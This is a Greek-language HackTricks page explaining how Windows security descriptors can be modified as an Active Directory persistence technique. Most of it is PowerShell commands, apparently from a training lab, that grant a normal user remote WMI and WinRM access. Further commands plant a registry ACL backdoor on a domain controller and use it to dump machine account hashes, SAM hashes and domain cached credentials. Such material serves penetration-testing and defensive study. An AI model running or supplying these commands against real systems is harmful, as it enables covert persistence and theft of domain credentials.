# Περιγραφείς Ασφάλειας

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Περιγραφείς Ασφάλειας

[Από τα έγγραφα](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Η Γλώσσα Ορισμού Περιγραφέα Ασφάλειας (SDDL) καθορίζει τη μορφή που χρησιμοποιείται για να περιγράψει έναν περιγραφέα ασφάλειας. Η SDDL χρησιμοποιεί αλφαριθμητικά ACE για το DACL και το SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

Οι **περιγραφείς ασφάλειας** χρησιμοποιούνται για να **αποθηκεύουν** τα **δικαιώματα** που ένα **αντικείμενο** έχει **πάνω** σε ένα **άλλο αντικείμενο**. Εάν μπορείτε απλά να **κάνετε μια μικρή αλλαγή** στον **περιγραφέα ασφάλειας** ενός αντικειμένου, μπορείτε να αποκτήσετε πολύ ενδιαφέρουσες προνομιούχες δικαιώματα πάνω σε αυτό το αντικείμενο χωρίς να χρειάζεστε να είστε μέλος μιας προνομιούχας ομάδας.

Στη συνέχεια, αυτή η τεχνική διατήρησης βασίζεται στη δυνατότητα να κερδίσετε κάθε δικαίωμα που χρειάζεται για συγκεκριμένα αντικείμενα, ώστε να μπορείτε να εκτελέσετε μια εργασία που συνήθως απαιτεί δικαιώματα διαχειριστή χωρίς την ανάγκη να είστε διαχειριστής.

### Πρόσβαση στο WMI

Μπορείτε να δώσετε σε έναν χρήστη πρόσβαση για **απομακρυσμένη εκτέλεση WMI** [**χρησιμοποιώντας αυτό**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Πρόσβαση στο WinRM

Δώστε πρόσβαση στο **winrm PS console σε έναν χρήστη** [**χρησιμοποιώντας αυτό**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Απομακρυσμένη πρόσβαση στις κατακερματισμένες τιμές

Αποκτήστε πρόσβαση στο **μητρώο** και **αντλήστε τις κατακερματισμένες τιμές** δημιουργώντας ένα **πίσω πόρτας Reg** χρησιμοποιώντας το [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** έτσι ώστε να μπορείτε ανά πάσα στιγμή να ανακτήσετε το **κατακερματισμένο τιμή του υπολογιστή**, το **SAM** και οποιαδήποτε **προσωρινή πιστοποίηση AD** στον υπολογιστή. Είναι πολύ χρήσιμο να δοθεί αυτή η άδεια σε έναν **κανονικό χρήστη έναντι ενός υπολογιστή Domain Controller**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Ελέγξτε το [**Silver Tickets**](silver-ticket.md) για να μάθετε πώς μπορείτε να χρησιμοποιήσετε το hash του λογαριασμού υπολογιστή ενός Domain Controller.

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
